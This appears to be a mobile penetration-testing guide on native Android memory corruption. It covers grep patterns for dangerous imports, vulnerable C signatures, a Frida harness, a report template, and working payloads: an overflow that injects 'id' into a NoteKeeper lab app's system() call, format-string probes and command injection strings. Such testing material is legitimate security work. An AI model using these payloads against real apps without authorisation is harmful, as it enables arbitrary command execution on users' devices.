# Native Buffer Overflow & Memory Corruption Patterns

When static analysis reveals native libraries (.so files) with dangerous function imports, test for memory corruption vulnerabilities that can lead to code execution.

## Detection (Phase 2 — Static)

### Step 1: Identify Dangerous Imports

```bash
# Check for dangerous functions
strings lib/arm64-v8a/lib*.so | grep -iE "system|exec|popen|dlopen|sprintf|strcpy|strcat|gets|memcpy"

# Check for embedded shell commands
strings lib/arm64-v8a/lib*.so | grep -iE "/bin/sh|/bin/|cmd|log.*date|echo"

# List JNI exports (attack surface from Java)
strings lib/arm64-v8a/lib*.so | grep "Java_"
```

### Step 2: Map the Attack Surface

| Import | Risk | Pattern |
|--------|------|---------|
| `system` | Critical | User input → shell command (injection or overflow into cmd string) |
| `exec`/`popen` | Critical | Same as system |
| `strcpy`/`strcat` | High | Unbounded copy → stack/heap overflow |
| `sprintf` | High | Format string + no bounds → overflow |
| `memcpy` | Medium | If length from user input → overflow |
| `gets` | Critical | Always exploitable (no bounds) |
| `dlopen` | High | If path from user input → library injection |

## Pattern 1: Adjacent Buffer Overwrite (NoteKeeper)

**Signature:**
```c
char title_buffer[100];
char log_command[] = "Log \"Note added at $(date)\"";

void parse(const char* input) {
    memcpy(title_buffer, input, strlen(input));  // NO bounds check
    // ... capitalize first letter ...
    system(log_command);  // Adjacent buffer — overwritten if input > 100
}
```

**Detection via Frida:**
```javascript
// Hook system() and test with increasing input lengths
Interceptor.attach(Module.findExportByName("libc.so", "system"), {
    onEnter: function(args) {
        console.log("system(): " + Memory.readUtf8String(args[0]));
    }
});
```

**Exploitation:**
```
[PADDING × buffer_size] + [shell_command] + ;#
```

The `;` terminates the injected command, `#` comments out the remaining original string.

**Finding the offset:**
1. Send increasing lengths (50, 60, 70... 200)
2. Watch `system()` argument via Frida hook
3. When the command string changes → overflow starts at that length
4. Fine-tune: binary search for exact byte offset

**Example (NoteKeeper — offset 100):**
```python
payload = "A" * 100 + "id > /data/data/com.mobilehackinglab.notekeeper/pwned.txt;#"
instance.parse(payload)
# system() executes: "id > .../pwned.txt;#\"Note added at $(date)\""
# Result: id output written to file
```

## Pattern 2: Stack Buffer Overflow → Return Address

**Signature:**
```c
void vulnerable(const char* input) {
    char buffer[64];
    strcpy(buffer, input);  // overflow → overwrite saved return address
}
```

**Detection:** App crashes (SIGSEGV) with long input. Check logcat:
```bash
adb logcat | grep -i "SIGSEGV\|SIGABRT\|Fatal signal"
```

**Note:** On modern Android (ARM64 + ASLR + stack canaries), classic ROP is hard. But adjacent-data overwrites (Pattern 1) bypass all mitigations since they don't corrupt control flow.

## Pattern 3: Format String

**Signature:**
```c
char buffer[256];
sprintf(buffer, user_input);  // user controls format string
// or: printf(user_input);
```

**Detection:**
```python
# Send format specifiers as input
instance.parse("%x%x%x%x")  # If output contains hex values → format string vuln
instance.parse("%s%s%s%s")  # May crash (reading invalid pointers)
instance.parse("%n%n%n%n")  # Write primitive (dangerous — may crash)
```

## Pattern 4: Command Injection via Native (PostBoard variant)

**Signature:**
```c
void run_command(const char* user_input) {
    char cmd[512];
    sprintf(cmd, "/path/to/script %s", user_input);
    system(cmd);  // shell metacharacters interpreted
}
```

**Exploitation:** Input: `; id #` or `$(id)` or `` `id` ``

## Frida Template for Native Vuln Testing

```python
import frida, time, subprocess

device = frida.get_usb_device()
subprocess.run(['adb', 'shell', 'am', 'force-stop', 'PACKAGE'])
time.sleep(1)

pid = device.spawn(['PACKAGE'])
session = device.attach(pid)

script = session.create_script("""
// Hook system/exec/popen
['system', 'popen'].forEach(function(func) {
    var addr = Module.findExportByName("libc.so", func);
    if (addr) {
        Interceptor.attach(addr, {
            onEnter: function(args) {
                console.log("[!] " + func + "(): " + Memory.readUtf8String(args[0]));
                send(func + ":" + Memory.readUtf8String(args[0]));
            }
        });
    }
});

// Hook memcpy to detect large copies
Interceptor.attach(Module.findExportByName("libc.so", "memcpy"), {
    onEnter: function(args) {
        var size = args[2].toInt32();
        if (size > 80) {  // suspicious large copy
            console.log("[*] memcpy size=" + size + " dst=" + args[0] + " src=" + args[1]);
        }
    }
});

send("READY");
""")

results = []
def on_message(msg, data):
    if msg['type'] == 'send':
        print(f"[*] {msg['payload']}")
        results.append(msg['payload'])

script.on('message', on_message)
script.load()
device.resume(pid)
time.sleep(3)

# Test with increasing lengths
script2 = session.create_script("""
Java.perform(function() {
    Java.choose("PACKAGE.MainActivity", {
        onMatch: function(instance) {
            [50, 100, 150, 200, 300, 500].forEach(function(len) {
                instance.NATIVE_METHOD("A".repeat(len));
            });
        },
        onComplete: function() { send("DONE"); }
    });
});
""")
script2.on('message', on_message)
script2.load()
time.sleep(8)
```

## Reporting

```markdown
## [MTEST-XXX] Buffer Overflow in Native [function] Enables Command Execution

**Severity:** Critical
**Component:** Client (Native — lib[name].so)
**OWASP Mobile:** M7: Client Code Quality

### Root Cause
- Fixed-size buffer: [N] bytes
- Unbounded copy: memcpy/strcpy without length check
- Adjacent target: system() command string / return address / function pointer

### Exploitation
- Offset: [N] bytes of padding
- Payload: [padding] + [command] + ;#
- Result: Arbitrary command execution as app UID

### Mitigations Bypassed
- ASLR: Not relevant (no control flow hijack needed)
- Stack canaries: Not relevant (adjacent data overwrite, not return address)
- NX/DEP: Not relevant (using existing system() call)
```

## Key Insight

Adjacent-buffer overwrites into `system()` arguments are the **easiest native exploit on modern Android** because they bypass ALL standard mitigations (ASLR, canaries, NX). You're not hijacking control flow — you're just changing what an existing `system()` call executes.

Always check: is there a `system()`/`popen()`/`exec()` call near a user-controlled buffer? If yes, measure the distance and overflow into it.
